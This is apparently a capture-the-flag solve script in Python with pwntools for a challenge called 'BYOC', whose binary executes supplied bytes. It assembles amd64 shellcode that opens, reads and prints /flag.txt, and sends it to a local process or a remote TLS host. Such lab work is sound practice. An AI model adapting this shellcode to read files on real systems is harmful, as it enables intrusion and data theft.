#!/usr/bin/env python3
# BYOC -- main() mmaps 200 bytes RWX, read()s our bytes into it, then calls it.
# No bug to find: just supply shellcode that open/read/write's /flag.txt.
#   usage: ./solve.py                       (local, needs a /flag.txt)
#          ./solve.py host:1337             (remote, TLS)
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'warn'

shellcode = asm('''
    lea  rdi, [rip+path]        /* open("/flag.txt", O_RDONLY, 0) */
    xor  esi, esi
    xor  edx, edx
    push 2
    pop  rax
    syscall

    mov  edi, eax               /* read(fd, rsp-0x200, 0x100) */
    sub  rsp, 0x200
    mov  rsi, rsp
    mov  edx, 0x100
    xor  eax, eax
    syscall

    mov  edx, eax               /* write(1, buf, n) */
    push 1
    pop  rdi
    push 1
    pop  rax
    syscall

    push 60                     /* exit(0) */
    pop  rax
    xor  edi, edi
    syscall
path:
    .string "/flag.txt"
''')
assert len(shellcode) <= 200, len(shellcode)

if len(sys.argv) > 1 and ':' in sys.argv[1]:
    host, port = sys.argv[1].rsplit(':', 1)
    io = remote(host, int(port), ssl=True, timeout=10)
else:
    io = process('./pwn_byoc/handout/byoc')

io.recvuntil(b'> ')
io.send(shellcode)
print(io.recvall(timeout=8).decode(errors='replace').strip())
